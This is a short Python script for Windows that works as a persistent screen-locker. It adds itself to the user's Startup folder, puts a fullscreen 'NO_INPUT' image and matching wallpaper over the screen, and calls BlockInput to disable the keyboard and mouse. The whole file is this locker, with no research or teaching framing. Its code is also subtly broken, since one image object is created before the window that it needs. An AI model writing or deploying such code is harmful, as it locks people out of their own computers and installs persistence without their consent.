import tkinter as tk
import ctypes
import os
import sys
import win32com.client
import PIL.Image, PIL.ImageTk
background=PIL.ImageTk.PhotoImage(PIL.Image.open("NO_INPUT.jpeg"))


def change_wallpaper(image_path):
    image_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    link_path = os.path.join(startup_path, "NO_INPUT.lnk")
    if not os.path.exists(link_path):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(link_path)
        shortcut.Targetpath = sys.executable
        shortcut.Arguments = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.Save()
add_to_startup()
root=tk.Tk()
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
image=PIL.Image.open("NO_INPUT.jpeg")
image2=PIL.ImageTk.PhotoImage(image)
image = image.resize((width, height), PIL.Image.LANCZOS)
background = PIL.ImageTk.PhotoImage(image)
label = tk.Label(root, image=background)
label.pack(fill="both", expand=True)
root.attributes("-fullscreen", True)
root.configure(background="black")
ctypes.windll.user32.BlockInput(True)
change_wallpaper("NO_INPUT.jpeg")
root.mainloop()